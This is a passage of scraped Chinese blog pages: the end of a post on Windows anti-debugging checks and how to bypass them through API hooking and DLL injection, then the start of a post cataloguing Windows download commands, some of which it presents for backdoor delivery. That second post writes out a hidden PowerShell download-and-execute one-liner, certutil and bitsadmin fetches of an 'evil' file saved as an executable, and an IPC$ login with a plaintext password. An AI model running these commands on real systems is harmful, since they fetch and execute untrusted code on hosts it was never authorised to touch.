CloseHandle(hProcessSnap); return processName;&#125;status = NtQueryInformationProcess( GetCurrentProcess(), ProcessBasicInformation,//此参数 0x00 &amp;processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), NULL);std::wstring parentProcessName = GetProcessNameById((DWORD)processBasicInformation.InheritedFromUniqueProcessId);if (L&quot;devenv.exe&quot; == parentProcessName)//也可以反向比较父进程的名称不是本进程名称就退出&#123; std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl; exit(-1);&#125; 4.3 NtQueryInformationProcess() 反反调试&emsp;绕过NtQueryInformationProcess检查的方法非常简单。我们需要修改NtQueryInformationProcess函数的返回值，修改成调试器不存在的值即可： 将ProcessDebugObjectHandle设置为0； 将ProcessDebugFlags设置为1； 对于ProcessBasicInformation，将InheritedFromUniqueProcessId的值修改为其他进程的ID。 4.3.1 ProcessDebugPort 反反调试&emsp;我们可以使用mhook来完成这个任务。为了设置hook，我们需要将DLL注入被调试的进程，然后使用mhook在DLLMain中设置hook。 &emsp;使用mhook的示例代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;Windows.h&gt;#include &quot;mhook.h&quot;typedef NTSTATUS(NTAPI *pfnNtQueryInformationProcess)( _In_ HANDLE ProcessHandle, _In_ UINT ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_opt_ PULONG ReturnLength );const UINT ProcessDebugPort = 7;pfnNtQueryInformationProcess g_origNtQueryInformationProcess = NULL;NTSTATUS NTAPI HookNtQueryInformationProcess( _In_ HANDLE ProcessHandle, _In_ UINT ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_opt_ PULONG ReturnLength )&#123; NTSTATUS status = g_origNtQueryInformationProcess( ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength); if (status == 0x00000000 &amp;&amp; ProcessInformationClass == ProcessDebugPort) &#123; *((PDWORD_PTR)ProcessInformation) = 0; &#125; return status;&#125;DWORD SetupHook(PVOID pvContext)&#123; HMODULE hNtDll = LoadLibrary(TEXT(&quot;ntdll.dll&quot;)); if (NULL != hNtDll) &#123; g_origNtQueryInformationProcess = (pfnNtQueryInformationProcess)GetProcAddress(hNtDll, &quot;NtQueryInformationProcess&quot;); if (NULL != g_origNtQueryInformationProcess) &#123; Mhook_SetHook((PVOID*)&amp;g_origNtQueryInformationProcess, HookNtQueryInformationProcess); &#125; &#125; return 0;&#125;BOOL WINAPI DllMain(HINSTANCE hInstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; switch (fdwReason) &#123; case DLL_PROCESS_ATTACH: DisableThreadLibraryCalls(hInstDLL); CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)SetupHook, NULL, NULL, NULL); Sleep(20); case DLL_PROCESS_DETACH: if (NULL != g_origNtQueryInformationProcess) &#123; Mhook_Unhook((PVOID*)&amp;g_origNtQueryInformationProcess); &#125; break; &#125; return TRUE;&#125; 4.3.2 ProcessDebugFlags反反调试&emsp;绕过ProcessDebugFlags反调试的手段和绕过 ProcessDebugPort 反调试的原理相同(详见 [2.3.2 绕过 ProcessDebugPort 反调试 章节](#4.3.1 ProcessDebugPort 反反调试)，只需要将ProcessDebugPort=0x07常量替换为ProcessDebugFlags=0x1f就可以。 4.3.3 ProcessDebugObjectHandle反反调试&emsp;绕过ProcessDebugObjectHandle反调试的手段和绕过 ProcessDebugPort 反调试的原理相同(详见 [2.3.2 绕过 ProcessDebugPort 反调试 章节](#4.3.1 ProcessDebugPort 反反调试)，只需要将ProcessDebugPort=0x07常量替换为ProcessDebugObjectHandle=0x1e就可以。 4.3.4 ProcessBasicInformation反反调试&emsp;绕过ProcessBasicInformation反调试的方法要灵活多变，最好的办法就是替换比较的进程名称。 5. RtlQueryProcessHeapInformation()反调试5.1 RtlQueryProcessHeapInformation()函数介绍&emsp;RtlQueryProcessHeapInformation()属于微软未公开的函数； 语法如下： 123NTAPI RtlQueryProcessHeapInformation( PDEBUG_BUFFER pDebugBuffer ) &emsp;在反调试代码中使用到了RtlCreateQueryDebugBuffer()函数，该函数在成功的情况下分配用于存储堆数据的缓冲区，它返回指向分配的调试缓冲区的指针。 1234//RtlCreateQueryDebugBuffer 在成功的情况下分配用于存储堆数据的缓冲区，它返回指向分配的调试缓冲区的指针PDEBUG_BUFFER NTAPI RtlCreateQueryDebugBuffer( IN ULONG Size, IN BOOLEAN EventPair) &emsp;调试缓冲区的声明如下： 123456789101112131415161718typedef struct _DEBUG_BUFFER &#123;HANDLE SectionHandle;PVOID SectionBase;PVOID RemoteSectionBase;ULONG SectionBaseDelta;HANDLE EventPairHandle;ULONG Unknown[2];HANDLE RemoteThreadHandle;ULONG InfoClassMask;ULONG SizeOfInfo;ULONG AllocatedSize;ULONG SectionSize;PVOID ModuleInformation;PVOID BackTraceInformation;PVOID HeapInformation;PVOID LockInformation;PVOID Reserved[8];&#125; DEBUG_BUFFER, *PDEBUG_BUFFER; &emsp;分配缓冲区后，我们可以调用堆进程调试信息，可以调用RtlQueryProcessDebugInformation来加载进程的所有堆块。此函数加载整个堆节点和进程的相应堆块。调试缓冲区包含指向偏移量为0x38的堆信息结构的指针。该堆结构的第一个参数是节点数，其后包含代表每个堆节点的DEBUG_HEAP_INFORMATION结构的数组。 1234567891011121314typedef struct _DEBUG_HEAP_INFORMATION&#123;ULONG Base; // 0x00ULONG Flags; // 0x04USHORT Granularity; // 0x08USHORT Unknown; // 0x0AULONG Allocated; // 0x0CULONG Committed; // 0x10ULONG TagCount; // 0x14ULONG BlockCount; // 0x18ULONG Reserved[7]; // 0x1CPVOID Tags; // 0x38PVOID Blocks; // 0x3C Heap block pointer for this node.&#125; DEBUG_HEAP_INFORMATION, *PDEBUG_HEAP_INFORMATION; 5.2 RtlQueryProcessHeapInformation()反调试c/c++代码 123456789bool Check()&#123; ntdll::PDEBUG_BUFFER pDebugBuffer = ntdll::RtlCreateQueryDebugBuffer(0, FALSE); if (!SUCCEEDED(ntdll::RtlQueryProcessHeapInformation((ntdll::PRTL_DEBUG_INFORMATION)pDebugBuffer))) return false; ULONG dwFlags = ((ntdll::PRTL_PROCESS_HEAPS)pDebugBuffer-&gt;HeapInformation)-&gt;Heaps[0].Flags; return dwFlags &amp; ~HEAP_GROWABLE;&#125; 5.3 RtlQueryProcessHeapInformation()反反调试&emsp;对于RtlQueryProcessHeapInformation()反反调试的唯一方法是HOOK 函数的返回值。 RTL_PROCESS_HEAPS::HeapInformation::Heaps[0]::Flags to HEAP_GROWABLE forRtlQueryProcessHeapInformation(). 6. RtlQueryProcessDebugInformation()6.1 RtlQueryProcessDebugInformation()函数介绍&emsp;NTDLL::RtlQueryProcessDebugInformation()函数可以被用来读取来自所请求的处理的处理存储器中的某些字段，包括堆标志。 语法如下： 123456NTSTATUSNTAPIRtlQueryProcessDebugInformation(IN ULONG ProcessId，IN ULONG DebugInfoClassMask，IN OUT PDEBUG_BUFFER DebugBuffer); 6.2 RtlQueryProcessDebugInformation()反调试&emsp;使用RtlQueryProcessDebugInformation()函数的反调试依然使用了RtlCreateQueryDebugBuffer()函数； c/c++代码如下; 123456789bool Check()&#123; ntdll::PDEBUG_BUFFER pDebugBuffer = ntdll::RtlCreateQueryDebugBuffer(0, FALSE); if (!SUCCEEDED(ntdll::RtlQueryProcessDebugInformation(GetCurrentProcessId(), ntdll::PDI_HEAPS | ntdll::PDI_HEAP_BLOCKS, pDebugBuffer))) return false; ULONG dwFlags = ((ntdll::PRTL_PROCESS_HEAPS)pDebugBuffer-&gt;HeapInformation)-&gt;Heaps[0].Flags; return dwFlags &amp; ~HEAP_GROWABLE;&#125; 6.3 RtlQueryProcessDebugInformation()反反调试&emsp;对于RtlQueryProcessDebugInformation()反反调试的唯一方法是HOOK 函数的返回值。 RTL_PROCESS_HEAPS::HeapInformation::Heaps[0]::Flags to HEAP_GROWABLE for RtlQueryProcessDebugInformation(). 7. NtQuerySystemInformation()7.1 NtQuerySystemInformation()函数介绍&emsp;NTDLL::NtQuerySystemInformation()函数检索指定的系统信息。其第一个参数表示指示要检索的系统信息的类型，第一个参数的值大多数未记录。这包括SystemKernelDebuggerInformation（0x23），该类型从Windows NT开始就存在。其在SystemKernelDebuggerInformation返回两个标志的值：KdDebuggerEnabled的后两个字节(al)和KdDebuggerNotPresent的前两个字节(ah)。因此，如果存在内核调试器，则ah中的返回值为零。 函数语法： 1234567891011121314/*参数1：SYSTEM_INFORMATION_CLASS中枚举的值之一，指示要检索的系统信息的类型。该函数用于检测程序参数2：指向接收所请求信息的缓冲区的指针。此信息的大小和结构取决于SystemInformationClass参数的值 ：参数3：SystemInformation参数指向的缓冲区大小，以字节为单位。参数4：指向函数写入请求信息实际大小的位置的可选指针。如果该大小小于或等于SystemInformationLength参数，则该函数将信息复制到SystemInformation缓冲区中；否则，函数将复制该信息。否则，它将返回NTSTATUS错误代码，并在ReturnLength中返回接收请求的信息所需的缓冲区大小。返回值：返回NTSTATUS成功或错误代码。*/__kernel_entry NTSTATUS NtQuerySystemInformation( IN SYSTEM_INFORMATION_CLASS SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength); 7.2 NtQuerySystemInformation()反调试c/c++代码如下： 12345678910111213141516171819202122enum &#123; SystemKernelDebuggerInformation = 0x23 &#125;;typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION &#123; BOOLEAN DebuggerEnabled; BOOLEAN DebuggerNotPresent; &#125; SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION; bool Check()&#123; NTSTATUS status; SYSTEM_KERNEL_DEBUGGER_INFORMATION SystemInfo; status = NtQuerySystemInformation( (SYSTEM_INFORMATION_CLASS)SystemKernelDebuggerInformation,//此参数为 0x23 &amp;SystemInfo,//这里是接收到的信息 sizeof(SystemInfo), NULL); return SUCCEEDED(status) ? (SystemInfo.DebuggerEnabled &amp;&amp; !SystemInfo.DebuggerNotPresent) : false;&#125; 7.3 NtQuerySystemInformation()反反调试&emsp;对于NtQuerySystemInformation()反反调试的唯一方法是HOOK 函数的返回值。 SYSTEM_KERNEL_DEBUGGER_INFORMATION::DebuggerEnabled to 0 andSYSTEM_KERNEL_DEBUGGER_INFORMATION::DebuggerNotPresent to 1 for theNtQuerySystemInformation() function in case of a SystemKernelDebuggerInformation query. 8. PEB::NtGlobalFlag反调试8.1 关于 PEB::NtGlobalFlag&emsp;在 32 位机器上, NtGlobalFlag字段位于PEB(进程环境块)0x68的偏移处, 64 位机器则是在偏移0xBC位置. 该字段的默认值为 0. 当调试器正在运行时, 该字段会被设置为一个特定的值. 尽管该值并不能十分可信地表明某个调试器真的有在运行, 但该字段常出于该目的而被使用。 &emsp;该字段包含有一系列的标志位. 由调试器创建的进程会设置以下标志位；可以通过检查这些标志的组合来检测调试器的存在。 123FLG_HEAP_ENABLE_TAIL_CHECK (0x10)FLG_HEAP_ENABLE_FREE_CHECK (0x20)FLG_HEAP_VALIDATE_PARAMETERS (0x40) 8.2 PEB::NtGlobalFlag 反调试x86系统汇编： 12345mov eax, fs:[30h]mov al, [eax+68h]and al, 70hcmp al, 70hjz being_debugged x64系统汇编 12345mov rax, gs:[60h]mov al, [rax+BCh]and al, 70hcmp al, 70hjz being_debugged WOW64汇编： 12345mov eax, fs:[30h]mov al, [eax+10BCh]and al, 70hcmp al, 70hjz being_debugged c/c++代码如下： 123456789101112131415#define FLG_HEAP_ENABLE_TAIL_CHECK 0x10#define FLG_HEAP_ENABLE_FREE_CHECK 0x20#define FLG_HEAP_VALIDATE_PARAMETERS 0x40#define NT_GLOBAL_FLAG_DEBUGGED (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)#ifndef _WIN64PPEB pPeb = (PPEB)__readfsdword(0x30);DWORD dwNtGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0x68);#elsePPEB pPeb = (PPEB)__readgsqword(0x60);DWORD dwNtGlobalFlag = *(PDWORD)((PBYTE)pPeb + 0xBC);#endif // _WIN64 if (dwNtGlobalFlag &amp; NT_GLOBAL_FLAG_DEBUGGED) goto being_debugged; 8.3 PEB::NtGlobalFlag 反反调试&emsp;绕过PEB::NtGlobalFlag反调试的方法就是将该字段重新设置为 0，修改该值的方法这里提供 4 种思路； 注册表HKLM\\System\\CurrentControlSet\\Control\\SessionManager的GlobalFlag的值会替换NtGlobalFlag字段. 尽管它随后还可能由 Windows 改变 , 注册表键值会对系统中所有进程产生影响并在重启后生效。当然这也产生了另一种检测调试器的方法: 如果一个调试器为了隐藏自己, 而将注册表中的键值复制到NtGlobalFlag字段中, 然而注册表中的键值事先已经替换并且尚未重启生效. 那么调试器只是复制了一个假的值, 而非真正需要的那个. 如果程序知道真正的值而非注册表中的那个假的值, 那么就可以察觉到调试器的存在。 依旧是GlobalFlag, 不过这里的是HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\&lt;filename&gt;. (映像劫持), 这里需要将&lt;filename&gt;替换为需要更改的可执行文件的文件名 (不需要指定路径). 设置好GlobalFlag后, 系统会将其值覆盖到NtGlobalFlag字段 (只单独为指定的进程覆盖)。 在加载配置表 (Load Configuration Table) 的两个字段: GlobalFlagsClear和GlobalFlagsSet. GlobalFlagsClear列出需要清空的标志位, 而GlobalFlagsSet则列出需要设置的标志位, 这些设置会在GlobalFlag应用之后再生效, 因此它可以覆盖掉GlobalFlag指定的值. 然而它无法覆盖掉 Windows 指定设置的标志位. 比如设置FLG_USER_STACK_TRACE_DB (0x1000)可以让 Windows 设置FLG_HEAP_VALIDATE_PARAMETERS (0x40)标志位, 就算FLG_HEAP_VALIDATE_PARAMETERS在加载配置表 (Load Configuration Table) 中被清空了, Windows 也会在随后的进程加载过程中重新设置。 当调试器创建进程时, Windows 会做出一些改变. 通过设置环境变量中的_NO_DEBUG_HEAP, NtGlobalFlag将会因为调试器而不会设置其中的 3 个堆的标志位. 当然它们依旧可以通过GlobalFlag或加载配置表中的GlobalFlagsSet继续设置. 9. Heap Flags9.1 Heap Flags 反调试&emsp;Heap flags包含有两个与NtGlobalFlag一起初始化的标志: Flags和ForceFlags. 这两个字段的值不仅会受调试器的影响, 还会由 windows 版本而不同, 字段的位置也取决于 windows 的版本. &emsp;堆包含两个字段，这些字段受调试器的存在影响。究竟如何影响它们取决于Windows版本。这些字段是Flags和ForceFlags。 &emsp;Flags和ForceFlags的值通常分别设置为HEAP_GROWABLE(2)和0。 Flags 字段： 在 32 位 Windows NT, Windows 2000 和 Windows XP 中, Flags位于堆的0x0C偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于0x40偏移处。 在 64 位 Windows XP 中, Flags字段位于堆的0x14偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于0x70偏移处。 ForceFlags 字段: 在 32 位 Windows NT, Windows 2000 和 Windows XP 中, ForceFlags位于堆的0x10偏移处. 在 32 位 Windows Vista 及更新的系统中, 它位于0x44偏移处。 在 64 位 Windows XP 中, ForceFlags字段位于堆的0x18偏移处, 而在 64 位 Windows Vista 及更新的系统中, 它则是位于0x74偏移处。 &emsp;在所有版本的 Windows 中, Flags字段的值正常情况都设为HEAP_GROWABLE(2), 而ForceFlags字段正常情况都设为0. 然而对于一个 32 位进程 (64 位程序不会有此困扰), 这两个默认值, 都取决于它的宿主进程(host process) 的 subsystem版本 (这里不是指所说的比如 win10 的 linux 子系统). 只有当subsystem在3.51及更高的版本, 字段的默认值才如前所述. 如果是在3.10-3.50版本之间, 则两个字段的HEAP_CREATE_ALIGN_16 (0x10000)都会被设置. 如果版本低于3.10, 那么这个程序文件就根本不会被运行. &emsp;如果某操作将Flags和ForgeFlags字段的值分别设为2和0, 但是却未对subsystem版本进行检查, 那么就可以表明该动作是为了隐藏调试器而进行的. &emsp;如果存在调试器，则在Windows NT，Windows 2000和32位Windows XP上，Flags字段会设置以下标志： 12345HEAP_GROWABLE(2)HEAP_TAIL_CHECKING_ENABLED(0x20)HEAP_FREE_CHECKING_ENABLED(0x40)HEAP_SKIP_VALIDATION_CHECKS(0x10000000)HEAP_VALIDATE_PARAMETERS_ENABLED(0x40000000) &emsp;在64位Windows XP和Windows Vista及更高版本上，如果存在调试器，则 标志字段将设置为以下标志的组合： 1234HEAP_GROWABLE (2)HEAP_TAIL_CHECKING_ENABLED (0x20)HEAP_FREE_CHECKING_ENABLED (0x40)HEAP_VALIDATE_PARAMETERS_ENABLED (0x40000000) 具体分析见《Heap Flags》。这里不多赘述。 c/c++代码 12345678910111213141516171819202122232425262728bool Check()&#123;#ifndef _WIN64 PPEB pPeb = (PPEB)__readfsdword(0x30); PVOID pHeapBase = !m_bIsWow64 ? (PVOID)(*(PDWORD_PTR)((PBYTE)pPeb + 0x18)) : (PVOID)(*(PDWORD_PTR)((PBYTE)pPeb + 0x1030)); DWORD dwHeapFlagsOffset = IsWindowsVistaOrGreater() ? 0x40 : 0x0C; DWORD dwHeapForceFlagsOffset = IsWindowsVistaOrGreater() ? 0x44 : 0x10;#else PPEB pPeb = (PPEB)__readgsqword(0x60); PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)pPeb + 0x30)); DWORD dwHeapFlagsOffset = IsWindowsVistaOrGreater() ? 0x70 : 0x14; DWORD dwHeapForceFlagsOffset = IsWindowsVistaOrGreater() ? 0x74 : 0x18;#endif // _WIN64 PDWORD pdwHeapFlags = (PDWORD)((PBYTE)pHeapBase + dwHeapFlagsOffset); PDWORD pdwHeapForceFlags = (PDWORD)((PBYTE)pHeapBase + dwHeapForceFlagsOffset); return (*pdwHeapFlags &amp; ~HEAP_GROWABLE) || (*pdwHeapForceFlags != 0);&#125; 9.22 Heap Flags 反反调试&emsp;将Flags值设置为HEAP_GROWABLE，并将ForceFlags值设置为0。这可以通过DLL注入来完成。如果使用OllyDbg或x32 / 64dbg作为调试器，则可以选择各种Anti-Debug插件，例如ScyllaHide。 c/c++ 123456789101112131415161718192021222324#ifndef _WIN64PPEB pPeb = (PPEB)__readfsdword(0x30);PVOID pHeapBase = !m_bIsWow64 ? (PVOID)(*(PDWORD_PTR)((PBYTE)pPeb + 0x18)) : (PVOID)(*(PDWORD_PTR)((PBYTE)pPeb + 0x1030));DWORD dwHeapFlagsOffset = IsWindowsVistaOrGreater() ? 0x40 : 0x0C;DWORD dwHeapForceFlagsOffset = IsWindowsVistaOrGreater() ? 0x44 : 0x10;#elsePPEB pPeb = (PPEB)__readgsqword(0x60);PVOID pHeapBase = (PVOID)(*(PDWORD_PTR)((PBYTE)pPeb + 0x30));DWORD dwHeapFlagsOffset = IsWindowsVistaOrGreater() ? 0x70 : 0x14;DWORD dwHeapForceFlagsOffset = IsWindowsVistaOrGreater() ? 0x74 : 0x18;#endif // _WIN64*(PDWORD)((PBYTE)pHeapBase + dwHeapFlagsOffset) = HEAP_GROWABLE;*(PDWORD)((PBYTE)pHeapBase + dwHeapForceFlagsOffset) = 0; 10. Heap Protection10.1 Heap Protection 介绍&emsp;如果HEAP_TAIL_CHECKING_ENABLED标志在设置NtGlobalFlag，序列0xABABABAB将被追加（在32位和64位Windows 4次两次）在分配的堆块的末端。 &emsp;如果HEAP_FREE_CHECKING_ENABLED标志在设置NtGlobalFlag，序列0xFEEEFEEE是否需要附加的字节填充在直到下一个存储块中的空的空间将被追加。 10.2 Heap Protection 反调试C/c++ 123456789101112bool Check()&#123; PROCESS_HEAP_ENTRY HeapEntry = &#123; 0 &#125;; do &#123; if (!HeapWalk(GetProcessHeap(), &amp;HeapEntry)) return false; &#125; while (HeapEntry.wFlags != PROCESS_HEAP_ENTRY_BUSY); PVOID pOverlapped = (PBYTE)HeapEntry.lpData + HeapEntry.cbData; return ((DWORD)(*(PDWORD)pOverlapped) == 0xABABABAB);&#125; 10.2 Heap Protection 反反调试&emsp;堆之后，手动修补32位的12个字节和32位的20个字节。HOOKkernel32！HeapAlloc（）并在分配后修补堆。 12345678910#ifndef _WIN64SIZE_T nBytesToPatch = 12;#elseSIZE_T nBytesToPatch = 20;#endif // _WIN64SIZE_T nDwordsToPatch = nBytesToPatch / sizeof(DWORD);PVOID pHeapEnd = (PBYTE)HeapEntry.lpData + HeapEntry.cbData;for (SIZE_T offset = 0; offset &lt; nDwordsToPatch; offset++) *((PDWORD)pHeapEnd + offset) = 0; 附加说明1. PEB详解&emsp;关于PEB的结构详见《struct PEB》 &emsp;PEB(Process Environment Block)是Windows操作系统内部使用的一个封闭结构。根据具体环境的不同，我们需要通过不同方法获取PEB结构指针。比如，我们可以使用如下代码获取x32及x64系统的PEB指针： 123456789// Current PEB for 64bit and 32bit processes accordinglyPVOID GetPEB()&#123;#ifdef _WIN64 return (PVOID)__readgsqword(0x0C * sizeof(PVOID));#else return (PVOID)__readfsdword(0x0C * sizeof(PVOID));#endif&#125; WOW64机制适用于在x64系统上启动的x32进程，此时会创建另一个PEB结构。在WOW64环境中，我们可以使用如下代码获取PEB结构指针： 1234567891011121314151617181920212223242526// Get PEB for WOW64 ProcessPVOID GetPEB64()&#123; PVOID pPeb = 0;#ifndef _WIN64 // 1. There are two copies of PEB - PEB64 and PEB32 in WOW64 process // 2. PEB64 follows after PEB32 // 3. This is true for versions lower than Windows 8, else __readfsdword returns address of real PEB64 if (IsWin8OrHigher()) &#123; BOOL isWow64 = FALSE; typedef BOOL(WINAPI *pfnIsWow64Process)(HANDLE hProcess, PBOOL isWow64); pfnIsWow64Process fnIsWow64Process = (pfnIsWow64Process) GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;), &quot;IsWow64Process&quot;); if (fnIsWow64Process(GetCurrentProcess(), &amp;isWow64)) &#123; if (isWow64) &#123; pPeb = (PVOID)__readfsdword(0x0C * sizeof(PVOID)); pPeb = (PVOID)((PBYTE)pPeb + 0x1000); &#125; &#125; &#125;#endif return pPeb;&#125; PEB中与反调试技术密切相关的成员有如下几个： 1234+0x002 BeingDebugged; UChar+0x00c Ldr ; Ptr32 _PEB_LDR_DATA+0X018 ProcessHeap ; Ptr32 Void+0x068 NtGlobalFlag ; Uint4B 2. 检查操作系统版本检查操作系统版本的示例代码如下所示： 12345678WORD GetVersionWord()&#123; OSVERSIONINFO verInfo = &#123; sizeof(OSVERSIONINFO) &#125;; GetVersionEx(&amp;verInfo); return MAKEWORD(verInfo.dwMinorVersion, verInfo.dwMajorVersion);&#125;BOOL IsWin8OrHigher() &#123; return GetVersionWord() &gt;= _WIN32_WINNT_WIN8; &#125;BOOL IsVistaOrHigher() &#123; return GetVersionWord() &gt;= _WIN32_WINNT_VISTA; &#125; 参考链接 Anti-Debug: Debug Flags Windows平台常见反调试技术梳理（上） 详解反调试技术 26种对付反调试的方法 静态反调试技术 详解反调试技术 详解反虚拟机技术 NtGlobalFlag Heap Flags","categories":[{"name":"逆向","slug":"逆向","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/"},{"name":"反调试","slug":"逆向/反调试","permalink":"http://wayoka.github.io/categories/%E9%80%86%E5%90%91/%E5%8F%8D%E8%B0%83%E8%AF%95/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://wayoka.github.io/tags/%E9%80%86%E5%90%91/"},{"name":"反调试","slug":"反调试","permalink":"http://wayoka.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"}]},{"title":"常用下载命令整理-Windows篇","slug":"常用下载命令之Windows","date":"2020-01-02T04:02:30.000Z","updated":"2021-10-29T09:45:15.273Z","comments":true,"path":"2020/01/02/常用下载命令之Windows/","link":"","permalink":"http://wayoka.github.io/2020/01/02/%E5%B8%B8%E7%94%A8%E4%B8%8B%E8%BD%BD%E5%91%BD%E4%BB%A4%E4%B9%8BWindows/","excerpt":"1.综述 一般来说，实现 Windows 文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式 。另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。 本文收集了 十几 种在Windows系统下常见的文件下载方式，Windows命令行自带工具下载指令列表如下： 其中 mshta、regsvr32、pubprn.vbs命令执行下载功能时需要相应的配置文件。 序号下载指令描述需要环境1PowerShell命令行外壳程序和脚本","text":"1.综述&emsp;一般来说，实现 Windows 文件下载执行的方式不外乎以下几种方式。第一种，远程下载文件到本地，然后再执行；第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式 。另外呢，只要你所在服务器的环境支持，你也可以通过任何一门语言来实现它，这种方式暂不在本文的讨论范围之内。 &emsp;本文收集了 十几 种在Windows系统下常见的文件下载方式，Windows命令行自带工具下载指令列表如下： 其中 mshta、regsvr32、pubprn.vbs命令执行下载功能时需要相应的配置文件。 序号 下载指令 描述 需要环境 1 PowerShell 命令行外壳程序和脚本环境 win2003、winXP不支持 2 Bitsadmin 命令行工具，可用于创建下载或上传工作和监测其进展情况 一般Windows系统都存在(XP除外) 3 certutil 作为证书服务的一部分安装 一般Windows系统都存在 4 ipc$ 文件共享 共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问 一般Windows系统都存在 5 FTP 文件传输，命令行下载上传指令 一般Windows系统都存在 6 msiexec 支持远程下载功能 一般Windows系统都存在 7 mshta mshta 用于执行 .hta 文件，而 hta 是 HTML Applocation 的缩写，也就是 HTML 应用程序。而 hta 中也支持 VBS。所以我们可以利用 hta 来下载文件。 一般Windows系统都存在，需要将下载地址写到hta文件中 8 rundll32 其下载文件依赖于WScript.shell这个组件 一般Windows系统都存在 9 regsvr32 Regsvr32命令用于注册COM组件，是Windows系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。 一般Windows系统都存在 10 pubprn.vbs 在Windows 7以上版本存在一个名为PubPrn.vbs的微软已签名WSH脚本，其位于C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US，仔细观察该脚本可以发现其显然是由用户提供输入（通过命令行参数），之后再将参数传递给GetObject() Windows 7以上版本 需要安装第三方应用/服务的下载指令列表如下： 序号 下载指令 描述 需要环境 1 wget wget 是一个从网络上自动下载文件的自由工具，支持通过 HTTP、HTTPS、FTP 三个最常见的 TCP/IP协议下载，并可以使用HTTP 代理。”wget” 这个名称来源于 “World Wide Web” 与 “get” 的结合。Wget下载地址：https://eternallybored.org/misc/wget/ https://eternallybored.org/misc/wget/ 2 curl curl是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行，它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称curl为下载工具，curl还包含了用于程序开发的libcurl。 3 ncat nc是一款安全工具，它还有其他的名字 Netcat， Ncat 可用来做端口扫描，端口转发，连接远程系统等。它是一款拥有多种功能的CLI 工具，可以用来在网络上读、写以及重定向数据，它被设计成可以被脚本或其他程序调用的可靠的后端工具，同时由于它能创建任意所需的连接，因此也是一个很好的网络调试工具。当目标主机上安装了ncat是我们可以使用ncat来实现文件下载，当然这种场景在实战中少之又少~ 4 Notepad Dialog Box 如果你有权限接入一台(远程连接或者物理机)电脑，但是当前用户权限不允许打开浏览器，这时你该怎么反弹一个shell回来呢？如果目标主机有安装notpad那么你可以通过此方式快速的从一个URL或者UNC路径当中下载文件到本地并执行来获取shell 5 TFTP 需要下载tftpd32.exe，文件传输，命令行下载上传指令 6 WinScp WinSCP 是一个 Windows 环境下使用 SSH 的开源图形化 SFTP 客户端。 一般Windows系统都存在 7 IEExec IEexec.exe 应用程序是 .NET Framework 附带程序，存在于多个系统白名单内。 一般Windows系统都存在，需要将下载地址写到hta文件中 2. 常用下载指令2.1 PowerShell远程下载文件保存在本地： 1powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.xx.xxx/imag/evil.txt&#x27;,&#x27;evil.exe&#x27;) 远程下载并执行命令： 12powershell -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.28.128/imag/evil.txt&#x27;))&quot; 2.2 Bitsadmin&emsp;BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度，自windows7 以上版本内置bitsadmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下，有着不错的性能。 远程下载文件保存在本地： 1bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\\test\\1.txt 2.3 certutil&emsp;certutil.exe是一个命令行程序，作为证书服务的一部分安装，你可以使用Certutil.exe转储和显示证书颁发机构（CA）配置信息，配置证书服务，备份和还原CA组件，以及验证证书，密钥对和证书链。 远程下载文件保存在本地： 1certutil -urlcache -split -f http://192.168.174.1:1234/evil.txt test.exe 2.4 ipc$ 文件共享&emsp;IPC$(Internet Process Connection) 是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。 123#建立远程 IPC 连接 net use \\\\192.168.28.128\\ipc$ /user:administrator &quot;abc123!&quot;#复制远程文件到本地主机 copy \\\\192.168.28.128\\c$\\2.txt D:\\test 2.5 FTP&emsp;一般情况下攻击者使用 FTP 上传文件需要很多交互的步骤，下面这个 bash 脚本，考虑到了交互的情况，可以直接执行并不会产生交互动作。 1ftp 127.0.0.1 usernamepasswordget fileexit 2.6 